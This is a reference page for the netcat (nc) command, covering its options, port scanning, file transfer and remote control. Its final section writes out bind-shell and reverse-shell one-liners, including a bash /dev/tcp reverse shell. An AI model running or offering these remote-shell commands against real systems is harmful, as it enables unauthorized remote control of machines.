nc
===

Netcat: The Swiss Army knife of networking tools

## Description

The **nc command** (short for **netcat**) is a utility for data stream operations over TCP, UDP, or Unix domain sockets (UDS). It can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports, and perform port scanning. It supports both IPv4 and IPv6. Unlike Telnet, `nc` is scriptable.

### Syntax

```shell
nc [-hlnruz][-g<gateway...>][-G<num_pointers>][-i<delay_secs>][-o<output_file>][-p<source_port>]
[-s<source_addr>][-v...][-w<timeout_secs>][hostname][port...]
```

### Options

```shell
-4 Use IPv4 only.
-6 Use IPv6 only.
-c Use TLS for connections or listening.
-D Enable socket debugging.
-g <gateway> Set hop gateways for source routing (up to 8).
-G <num> Set source routing pointer (multiple of 4).
-h Display help.
-i <secs> Set delay interval for lines sent and ports scanned.
-l Listen mode, for inbound connections.
-n Do not use DNS resolution for hostnames.
-o <file> Hex dump traffic to the specified file.
-p <port> Specify local port for connections.
-r Choose source and destination ports randomly.
-s <addr> Specify local IP address for the connection.
-u Use UDP instead of TCP.
-v Verbose mode, show execution details.
-w <secs> Set timeout for connection attempts and network reads.
-z Zero-I/O mode, used for scanning.
```

### Examples

**TCP Port Scanning**

```shell
[root@localhost ~]# nc -v -z -w2 192.168.0.3 1-100 
192.168.0.3: inverse host lookup failed: Unknown host
(UNKNOWN) [192.168.0.3] 80 (http) open
(UNKNOWN) [192.168.0.3] 23 (telnet) open
(UNKNOWN) [192.168.0.3] 22 (ssh) open
```

Scan ports 1-100 on 192.168.0.3.

**UDP Port Scanning**

```shell
[root@localhost ~]# nc -u -z -w2 192.168.0.3 1-1000  # Scan UDP ports 1-1000
```

**Scan a Specific Port**

```shell
[root@localhost ~]# nc -nvv 192.168.0.1 80 # Scan port 80
(UNKNOWN) [192.168.0.1] 80 (?) open
y  // user input
```

Check if outbound port 443 is blocked by a firewall.

```shell
nc -vz acme-v02.api.letsencrypt.org 443 -w2
# Ncat: Version 7.50 ( https://nmap.org/ncat )
# Ncat: Connected to 23.77.214.183:443.
# Ncat: 0 bytes sent, 0 bytes received in 0.07 seconds.
```

**File Transfer**

```shell
# Receiver: set up listener and specify output filename.
nc -lp 8888 > node.tar.gz

# Sender: send the file.
nc -nv 192.168.75.121 8888 < node_exporter-1.3.1.linux-amd64.tar.gz
# Note: 192.168.75.121 is the receiver's IP address.
```

```shell
# To exit automatically after transfer, use -i:
nc -lp 8888 > node.tar.gz
nc -nv 192.168.75.121 8888 -i 1 < node_exporter-1.3.1.linux-amd64.tar.gz
# Note: -i specifies the idle timeout.
```

**Remote Control**

```shell
# Forward Bind Shell: The target listens and provides a shell.
# On the target:
nc -lvnp 8888 -c bash
# On the controller:
nc 192.168.75.121 8888
```

```shell
# Reverse Shell: The controller listens, and the target connects back with a shell.
# On the controller:
nc -lvnp 8888
# On the target:
nc 192.168.75.121 8888 -c bash
```

**Alternative Reverse Shell (using Bash)**

```shell
# On the controller:
nc -lvnp 8888
```

```shell
# On the target:
bash -i &> /dev/tcp/192.168.75.121/8888 0>&1
```
